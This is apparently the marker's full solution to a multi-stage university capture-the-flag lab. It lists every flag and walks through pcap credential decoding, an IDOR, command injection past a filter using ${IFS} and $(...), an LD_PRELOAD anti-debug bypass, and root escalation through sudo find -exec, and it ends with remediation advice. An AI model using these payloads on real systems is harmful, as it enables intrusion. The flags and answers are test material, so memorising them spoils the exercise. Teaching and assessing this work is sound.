# Full solution, network route (for markers / last resort)

Exact steps, start to finish. If you're trying to solve it yourself, use
`PLAYER-BRIEF.md` and `HINTS.md` first.

**Flags (one per challenge):**
- Network (packet capture): `CITS3006{l4A5p3MGYr}` (shown on the portal dashboard after login)
- Horizontal PE (IDOR): `CITS3006{2cXVYDsVXj}` (inside config record #48879)
- Web injection (router): `CITS3006{24n4CBiT2K}` (read via the command injection)
- Vertical PE (root): `CITS3006{xyOTpUwAhd}` (final disarm flag, `/home/fieldtech/disarm-authorization.txt`)

Chain: pcap → portal IDOR → router injection (flag + firmware) → reverse the
firmware (RE) → SSH + vertical privesc → root.

---

## Step 1, operator credential from the packet capture

Open `capture.pcap` in Wireshark (recon's `intercept-notes.txt` ships with it and
says what to look for). There's background traffic (DNS, HTTP), so filter to the
polls that carry the auth token:
```
http contains "X-Aero-Session"
```
Two `GET /telemetry/status` requests show. This isn't standard Basic auth, it's a
**custom header**, `X-Aero-Session: <blob>`, so Wireshark doesn't decode it for you.
The blob is **base64 of a small JSON object**. Check each request's response and
decode the one that was **accepted (200)**:
```bash
echo 'eyJ1Ijoiay5yZXllcyIsInAiOiJSM3llcyFvcHMyMDI3In0=' | base64 -d
# {"u":"k.reyes","p":"R3yes!ops2027"}
```
- the token that got **401** → decoy (`Summer2026!`), ignore
- the token that got **200** → **real** → `k.reyes` / `R3yes!ops2027`

(No flag is in the capture, the prize is the credential.)

## Step 2, log in, then IDOR to the router config

Browse to the Operations Records Portal (`http://<host>:8090/`), log in as
`k.reyes` / `R3yes!ops2027`. Logging in with the sniffed credential completes the
**network** stage, and the dashboard shows its flag: `CITS3006{l4A5p3MGYr}`. The
portal only lists your own records, and a note says the reference in each record URL
is an encoded form of the record number.

**Work out the encoding.** Take one of your own record references, e.g.
`/document/34303232`, and decode it (CyberChef, *From Hex*):
```
34303232  ->  "4022"      (your own record number, so the ref is the number in hex)
```

**Enumerate past your own records (the IDOR).** If the reference is just the number
hex-encoded, then it isn't a permission check. Encode the neighbouring numbers and
open them, e.g. 4023:
```
"4023"  ->  To Hex  ->  34303233  ->  /document/34303233
```
That record belongs to another operator (m.okonkwo) and was never listed for you,
which is the bug: the endpoint never checks ownership. Its body is the breadcrumb,
it says the router's maintenance snapshot is filed under **NetOps record #48879**.

**Open the config record.** Hex-encode 48879 the same way and request it:
```
"48879"  ->  3438383739  ->  /document/3438383739
```
That record (owner `m.okonkwo`, "Maintenance snapshot: device export") is a peer's
record you were never shown, so reaching it is the **horizontal PE** stage, and the
record carries its flag: `CITS3006{2cXVYDsVXj}`. It's also the router config:
```
mgmt.telnet.user     = support
mgmt.telnet.pass_enc = HDs2OWo0eSguKHtoaA==
mgmt.telnet.enc      = xor0x5a+base64
!  cross-team access token (horizontal): CITS3006{2cXVYDsVXj}
```
Decode per the stated scheme, base64-decode, then XOR each byte with `0x5A`:
```bash
python3 -c "import base64; print(''.join(chr(b^0x5A) for b in base64.b64decode('HDs2OWo0eSguKHtoaA==')))"
# Falc0n#rtr!22
```
Telnet backdoor: `support` / `Falc0n#rtr!22`.

## Step 3, telnet in, inject, read the flag, grab the firmware

```bash
telnet <host> 23
login: support
password: Falc0n#rtr!22
```
The MOTD warns input is "sanitised" and points at one artefact,
`/opt/maint/rtr-01.snapshot`. The naive injection is blocked:
```
RTR-01> ping 8.8.8.8; cat /opt/maint/*
% illegal character(s) in host argument
```
Bypass the space/char filter with `${IFS}` (whitespace) and `$(...)` (command
substitution). `ping` echoes what it can't resolve, so the file contents come back
in the error line. The snapshot holds the flag AND the firmware URL joined in one
token, so a single read hands you both:
```
RTR-01> ping $(cat${IFS}/opt/maint/rtr-01.snapshot)
ping: CITS3006{24n4CBiT2K}::ota-firmware::http://ROUTER-HOST:8081/fw/1edca15d3306/acc-rtr01-fw.elf: Name or service not known
```
`$(id)`, `$(ls${IFS}/)` etc. all work, it's full command execution.

Now download the firmware from that URL (swap `ROUTER-HOST` for the router's actual
address; the endpoint is on tcp/8081, served **only** at that secret path):
```bash
curl -O http://<host>:8081/fw/1edca15d3306/acc-rtr01-fw.elf
file acc-rtr01-fw.elf     # ELF 64-bit ... not stripped
```

## Step 4, reverse the firmware  *(the shared RE challenge)*

`acc-rtr01-fw.elf` is the reverse-engineering binary. Summary of the intended
solve (its own repo has the full write-up):
- It calls `ptrace(PTRACE_TRACEME,...)` and exits if a debugger is attached.
  Bypass with `LD_PRELOAD`, a tiny shared lib whose `ptrace` always returns 0:
  ```c
  long ptrace(int r,int p,void*a,void*d){return 0;}
  ```
  `gcc -shared ptrace.c -o ptrace.so`, then in gef `set environment LD_PRELOAD=./ptrace.so`.
- It asks for a password and compares a djb2-style hash to `4918347965232805349`.
  Rather than crack it, set a breakpoint at the compare and patch the input (and the
  stored hash value) in memory to match, so you enter the success branch.
- The branch seeds `srand()` with the hash and XORs an embedded buffer to print the
  reward. It reveals:
  ```
  username: fieldtech
  password: FieldT3ch_2874
  ```

## Step 5, SSH in and escalate to root (vertical privesc)

```bash
ssh fieldtech@<host> -p 2022        # password: FieldT3ch_2874
```
You land as low-priv `fieldtech`. Check your sudo rights:
```bash
sudo -l
# User fieldtech may run the following commands on this host:
#     (root) NOPASSWD: /usr/bin/find
```
You can run `find` as root with no password. `find`'s `-exec` runs a program, and
sudo runs `find` itself as root, so the spawned program is root too (GTFOBins):
```bash
sudo find . -maxdepth 0 -exec /bin/sh \;    # -> root shell
id                                           # uid=0(root)
cat /home/fieldtech/disarm-authorization.txt                               # CITS3006{xyOTpUwAhd}
# (or in one line: sudo find . -maxdepth 0 -exec cat /home/fieldtech/disarm-authorization.txt \;)
```

## One-command proof (demo backup)
```bash
python3 solve.py <host>
# pcap -> console IDOR -> decode -> telnet inject -> flag + firmware URL,
# then downloads the firmware and confirms it's the RE binary.
```

## Remediation (for the report)

- **Step 1:** don't send credentials over plain HTTP, use TLS. Base64 (the
  X-Aero-Session token) is encoding, not encryption; anyone on the wire reads it.
- **Step 2:** one missing check, the server must verify the record's owner matches
  the logged-in operator before serving it (left commented in `app.py`). Hex-encoding
  the record ID is **not** access control (obfuscation ≠ authz). Don't store device
  passwords with reversible "encoding" (XOR+base64) either.
- **Step 3:** never build a shell command from user input. Pass args as a list (no
  `shell=True`) or strictly allow-list the host. Character blocklists don't work , 
  `${IFS}`/`$()` walk straight through. Don't expose firmware behind a "secret" URL
  as the only control, and don't ship anti-debug as your security (see step 4).
- **Step 5:** don't grant NOPASSWD sudo on binaries that can execute other programs
  (`find`, `vim`, `less`, `awk`, interpreters); check GTFOBins before writing a
  sudoers rule. If a scan is needed, wrap it in a locked-down non-interactive script.
